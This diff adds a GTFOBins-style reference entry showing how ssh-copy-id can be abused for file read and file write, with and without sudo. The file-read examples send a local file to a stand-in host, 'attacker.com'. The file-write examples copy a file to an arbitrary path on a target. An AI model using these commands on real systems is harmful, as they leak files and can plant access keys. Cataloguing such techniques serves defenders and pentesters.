@@ -1,0 +1,24 @@
+ssh-copy-id
+===========
+
+File read
+---------
+
+[Sudo]
+    ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
+    The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.
+
+[Unprivileged]
+    ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
+    The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.
+
+File write
+----------
+
+[Sudo]
+    ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
+    The input file must have the `.pub` file extension.
+
+[Unprivileged]
+    ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
+    The input file must have the `.pub` file extension.
